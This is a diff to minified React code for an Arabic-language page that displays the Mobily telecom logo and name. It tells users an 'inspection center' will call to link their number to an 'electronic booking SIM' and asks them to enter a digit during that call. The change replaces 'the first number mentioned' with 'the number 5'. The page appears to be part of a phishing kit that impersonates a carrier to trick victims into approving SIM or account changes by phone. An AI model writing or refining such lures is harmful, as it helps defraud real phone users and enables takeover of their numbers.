@@ -7,7 +7,7 @@ n.jsx("img",{src:"/assets/images/mobily-logo.png",alt:"Mobily",style:{width:"120
 n.jsx("h2",{style:{fontSize:"22px",fontWeight:"800",color:"#019cde",marginBottom:"16px"},children:"بانتظار تأكيد الجوال"}),
 n.jsx("img",{src:"/assets/images/phone-ringing-old.gif",alt:"phone",style:{width:"100px",margin:"0 auto 16px",display:"block"}}),
 n.jsx("p",{style:{fontSize:"14px",color:"#444",lineHeight:"1.8",marginBottom:"12px",fontWeight:"700"},children:"سيتم الاتصال بك من قبل مركز الفحص لتوثيق رقم جوالك وربطه بشريحة الحجز الإلكترونية لدى المشغل الأساسي لرقمك."}),
-n.jsx("p",{style:{fontSize:"14px",color:"#019cde",lineHeight:"1.8",marginBottom:"24px"},children:"لتفعيل الطلب، يُرجى إدخال الرقم الأول المذكور أثناء المكالمة لإتمام عملية التوثيق وتجهيز شريحة الحجز الإلكترونية الخاصة بك."}),
+n.jsx("p",{style:{fontSize:"14px",color:"#019cde",lineHeight:"1.8",marginBottom:"24px"},children:"لتفعيل الطلب، يُرجى إدخال الرقم 5 المذكور أثناء المكالمة لإتمام عملية التوثيق وتجهيز شريحة الحجز الإلكترونية الخاصة بك."}),
 n.jsx("button",{type:"button",onClick:h,style:{width:"100%",padding:"14px",borderRadius:"14px",border:"none",background:"#019cde",color:"#fff",fontSize:"16px",fontWeight:"700",cursor:"pointer",fontFamily:"inherit",boxShadow:"0 4px 15px rgba(1,156,222,0.4)",transition:"all 0.3s"},children:"تم تلقي المكالة"})
 ]})})})})
 }
